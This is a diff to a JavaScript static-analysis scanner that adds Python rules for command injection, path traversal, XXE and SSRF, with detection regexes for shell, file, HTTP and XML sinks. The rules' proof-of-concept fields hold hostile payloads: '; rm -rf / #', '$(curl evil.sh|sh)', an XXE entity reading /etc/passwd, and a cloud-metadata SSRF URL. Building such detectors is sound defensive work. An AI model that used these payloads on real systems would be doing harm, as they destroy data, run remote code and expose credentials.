@@ -842,6 +842,20 @@ const PatternEngine = (()=>{
     return !!q;
   };
   const isComment=line=>/^\s*(\/\/|#|\*|\/\*)/.test(line);
+  // True when the call matched by `sinkRe` is passed a *variable* (an identifier, an
+  // f-string/template interpolation, or concatenation) rather than only string literals.
+  // Lets the command-injection / SSRF / XXE / path rules skip pure-literal, fixed calls
+  // (e.g. os.system('ls -la'), requests.get('https://api.example.com')).
+  const callHasVar=(line,sinkRe)=>{
+    const m=sinkRe.exec(line);if(!m)return false;
+    let rest=line.slice(m.index+m[0].length);                 // argument list (single-line view)
+    if(/[frbuFRBU]*["'][^"'`]*\{[^}]+\}/.test(rest)||/`[^`]*\$\{[^}]+\}/.test(rest))return true; // f-string / template interp
+    rest=rest.replace(/[frbuFRBU]*(["'])(?:\\.|(?!\1).)*\1/g,'')   // drop '...' and "..." literals (with f/r/b prefix)
+             .replace(/`(?:\\.|[^`])*`/g,'')                       // drop `...` template literals
+             .replace(/\b(True|False|None|null|undefined)\b/g,'')  // keyword constants aren't variables
+             .replace(/\b\w+\s*=(?!=)/g,'');                       // drop kwarg names (shell=, mode=, timeout=)
+    return /[A-Za-z_]\w*/.test(rest);
+  };
 
   const RULES=[
     /* ───────── SECURITY ───────── */
@@ -1156,13 +1170,74 @@ const PatternEngine = (()=>{
      poc:"Inject `__import__('os').system('id')` into the evaluated expression.",
      learn:'https://cwe.mitre.org/data/definitions/95.html'},
 
-    {id:'py-path-traversal',cat:'security',sev:7,cwe:'CWE-22',cvss:7.5,langs:['py'],
-     title:'Possible path traversal in open()',
-     test:l=>/\bopen\s*\(/.test(l)&&/(request\.|args\.|params|filename|user_|input\(|\.GET|\.POST|path\s*\+|os\.path\.join\([^)]*request)/i.test(l),
-     desc:'A file path derived from user input may allow ../ traversal to read/write arbitrary files.',
-     fix:l=>'# Validate the resolved path stays within an allowed root:\n# safe = os.path.realpath(os.path.join(ROOT, name)); assert safe.startswith(ROOT)',
-     poc:'Request a filename like `../../etc/passwd`.',
+    {id:'sec-py-cmd-injection',cat:'security',sev:9,cwe:'CWE-78',cvss:9.8,langs:['py'],
+     title:'Command injection — user input reaches shell execution',
+     test:l=>{
+       if(isComment(l))return false;
+       const sink=/\b(?:os\.system|os\.popen|commands\.getoutput|subprocess\.(?:call|run|Popen|check_output|check_call))\s*\(/;
+       if(!sink.test(l))return false;
+       // subprocess(..., shell=True) is already reported by py-shell-true — don't double-report
+       if(/subprocess\./.test(l)&&/shell\s*=\s*True/.test(l))return false;
+       return callHasVar(l,sink);   // only when a variable (not a pure string literal) is passed
+     },
+     desc:'User-controlled input flows into a shell/command execution call (os.system, os.popen, subprocess, commands.getoutput). An attacker can append shell metacharacters to run arbitrary OS commands.',
+     fix:l=>'# Never build commands from input. Pass an arg list and shell=False:\n# subprocess.run(["ls", "-l", path], shell=False)  # and validate `path`',
+     poc:'Supply `; rm -rf / #` or `$(curl evil.sh|sh)` in the injected value.',
+     learn:'https://cwe.mitre.org/data/definitions/78.html'},
+
+    {id:'sec-py-path-traversal',cat:'security',sev:7,cwe:'CWE-22',cvss:7.5,langs:['py'],
+     title:'Path traversal — user controls file path',
+     test:l=>{
+       if(isComment(l))return false;
+       const guarded=/secure_filename|os\.path\.realpath|os\.path\.abspath|startswith|whitelist|allowlist/i.test(l);
+       if(guarded)return false;
+       // open()/send_file()/send_from_directory() with a request-derived path
+       if(/\b(?:open|send_file|send_from_directory)\s*\(/.test(l)
+          && /(\brequest\b|\.args\.get|\.form\.get|\.values\.get|\.GET\b|\.POST\b|\bfilename\b|\buser_|\binput\s*\()/i.test(l))return true;
+       // os.path.join(base, <user input>) without a sanitization guard on the line
+       if(/os\.path\.join\s*\([^)]*\b(?:request|args|params|filename|user_|input)\b/i.test(l))return true;
+       return false;
+     },
+     desc:'A file path derived from user input may allow ../ traversal to read or write arbitrary files outside the intended directory (open, send_file, send_from_directory, os.path.join).',
+     fix:l=>'# Confine to an allowed root after resolving symlinks:\n# safe = os.path.realpath(os.path.join(ROOT, name)); assert safe.startswith(ROOT + os.sep)\n# Flask: werkzeug.utils.secure_filename(name)',
+     poc:'Request a path like `../../etc/passwd` (or `..\\..\\windows\\win.ini`).',
      learn:'https://cwe.mitre.org/data/definitions/22.html'},
+
+    {id:'sec-xxe',cat:'security',sev:9,cwe:'CWE-611',cvss:9.1,langs:['py','js'],
+     title:'XXE — XML parsed from user input without disabling external entities',
+     test:l=>{
+       if(isComment(l))return false;
+       const pySink=/\b(?:lxml\.etree\.parse|lxml\.etree\.fromstring|etree\.parse|etree\.fromstring|ElementTree\.parse|ElementTree\.fromstring|minidom\.parseString|minidom\.parse)\s*\(/;
+       if(pySink.test(l))
+         return callHasVar(l,pySink)&&!/resolve_entities\s*=\s*False|no_network\s*=\s*True|defusedxml/i.test(l);
+       // JS/TS: DOMParser().parseFromString(xml,'text/xml') or libxmljs.parseXml(xml)
+       const jsParse=/\.parseFromString\s*\(/;
+       if(jsParse.test(l)&&/text\/xml|application\/xml|image\/svg/i.test(l))return callHasVar(l,jsParse);
+       const libxml=/\blibxmljs\.parseXml(?:String)?\s*\(/;
+       if(libxml.test(l))return callHasVar(l,libxml);
+       return false;
+     },
+     desc:'XML is parsed from user input without disabling external entity (XXE) resolution. An attacker can read local files, perform SSRF, or cause denial of service via crafted DOCTYPE/ENTITY declarations.',
+     fix:l=>'# Python: use defusedxml, or an lxml parser with entities off:\n# parser = lxml.etree.XMLParser(resolve_entities=False, no_network=True)\n# JS: avoid DOMParser for untrusted XML, or strip DOCTYPE before parsing.',
+     poc:'Submit `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`.',
+     learn:'https://cwe.mitre.org/data/definitions/611.html'},
+
+    {id:'sec-ssrf',cat:'security',sev:9,cwe:'CWE-918',cvss:9.1,langs:['py','js'],
+     title:'SSRF — user controls HTTP request destination',
+     test:l=>{
+       if(isComment(l))return false;
+       // skip clearly same-origin / relative URLs (templates or concats starting with '/')
+       const relUrl=/\(\s*[`'"]\s*\.{0,2}\//.test(l);
+       const pySink=/\b(?:requests\.(?:get|post|put|delete|head|patch|request)|urllib\.request\.urlopen|urllib2?\.urlopen|httpx\.(?:get|post|request|Client)|aiohttp\.[A-Za-z]+)\s*\(/;
+       if(pySink.test(l))return !relUrl&&callHasVar(l,pySink);
+       const jsSink=/\b(?:fetch|axios(?:\.(?:get|post|put|delete|request))?|got|superagent\.[a-z]+|https?\.request)\s*\(/;
+       if(jsSink.test(l))return !relUrl&&callHasVar(l,jsSink);
+       return false;
+     },
+     desc:'A URL passed to an HTTP client is user-controlled. An attacker can point it at internal services (cloud metadata, localhost admin ports) to exfiltrate data or pivot — server-side request forgery.',
+     fix:l=>'// Validate the URL against an allowlist of hosts/schemes before the request,\n// and block private/link-local ranges (169.254.169.254, 10.x, 127.x, ::1).',
+     poc:'Supply `http://169.254.169.254/latest/meta-data/` or `http://localhost:6379/` as the URL.',
+     learn:'https://cwe.mitre.org/data/definitions/918.html'},
 
     {id:'py-django-debug',cat:'security',sev:6,cwe:'CWE-489',cvss:5.3,langs:['py'],
      title:'Django DEBUG=True (info disclosure)',
@@ -2046,7 +2121,7 @@ const DataFlowEngine = (()=>{
     {re:/req\.body\b/,name:'req.body'},{re:/req\.params\b/,name:'req.params'},
     {re:/req\.query\b/,name:'req.query'},{re:/req\.headers\b/,name:'req.headers'},
     {re:/req\.cookies\b/,name:'req.cookies'},
-    {re:/request\.(form|args|json|GET|POST)/,name:'request input (Py)'},
+    {re:/request\.(form|args|json|data|values|files|cookies|GET|POST)/,name:'request input (Py)'},
     {re:/\$_(GET|POST|REQUEST|COOKIE|SERVER)/,name:'PHP superglobal'},
     {re:/localStorage\.getItem|sessionStorage\.getItem/,name:'web storage'},
     {re:/location\.(search|hash|href)|URLSearchParams|new URL\(/,name:'URL params'},
@@ -2064,6 +2139,12 @@ const DataFlowEngine = (()=>{
     {re:/fs\.(readFile|readFileSync|writeFile|createReadStream)\s*\(|sendFile\s*\(/,name:'fs read/write',sev:7,cwe:'CWE-22',kind:'path'},
     {re:/res\.(json|send|render|redirect)\s*\(/,name:'res.json()/send()',sev:4,cwe:'CWE-79',kind:'reflect'},
     {re:/dangerouslySetInnerHTML/,name:'dangerouslySetInnerHTML',sev:7,cwe:'CWE-79',kind:'XSS'},
+    // Python sinks
+    {re:/\b(?:subprocess\.(?:call|run|Popen|check_output|check_call)|os\.system|os\.popen|commands\.getoutput)\s*\(/,name:'subprocess/os.system',sev:9,cwe:'CWE-78',kind:'command'},
+    {re:/\bopen\s*\(/,name:'open()',sev:7,cwe:'CWE-22',kind:'path'},
+    {re:/\b(?:requests\.(?:get|post|put|delete|head|patch|request)|urllib\.request\.urlopen|urllib2?\.urlopen|httpx\.(?:get|post|request))\s*\(/,name:'requests/urlopen',sev:9,cwe:'CWE-918',kind:'SSRF'},
+    {re:/\b(?:lxml\.etree\.parse|lxml\.etree\.fromstring|etree\.parse|etree\.fromstring|ElementTree\.parse|ElementTree\.fromstring|minidom\.parseString|minidom\.parse)\s*\(/,name:'XML parse',sev:9,cwe:'CWE-611',kind:'XXE'},
+    {re:/\b(?:pickle|cPickle|dill)\.loads?\s*\(/,name:'pickle.loads',sev:9,cwe:'CWE-502',kind:'deserialization'},
   ];
   const SANITIZERS=/escape|sanitize|encodeURI|validator|joi|zod|yup|parseInt|parseFloat|Number\(|toString\(|escapeHtml|DOMPurify|whitelist|allowlist|\.test\(|typeof\s|Array\.isArray|bcrypt|hash/i;
 
@@ -2753,6 +2834,8 @@ const QuickWins = (()=>{
     const specific={'sec-cookie-flags':'Blocks XSS cookie theft','sec-rand-token':'Prevents token prediction attacks',
       'sec-sql-concat':'Prevents database compromise via SQL injection','sec-jwt-decode':'Prevents auth bypass via forged tokens',
       'py-sql-fstring':'Prevents database compromise via SQL injection','py-shell-true':'Prevents OS command injection',
+      'sec-py-cmd-injection':'Prevents OS command injection','sec-py-path-traversal':'Prevents arbitrary file read/write',
+      'sec-xxe':'Prevents file disclosure / SSRF via XML entities','sec-ssrf':'Prevents pivots to internal services via forged requests',
       'py-secret-key':'Prevents session/cookie forgery','sec-http-url':'Stops cleartext data interception',
       'sec-csrf-missing':'Blocks cross-site request forgery on state-changing routes',
       'sec-open-redirect':'Stops attacker-controlled redirects used for phishing',
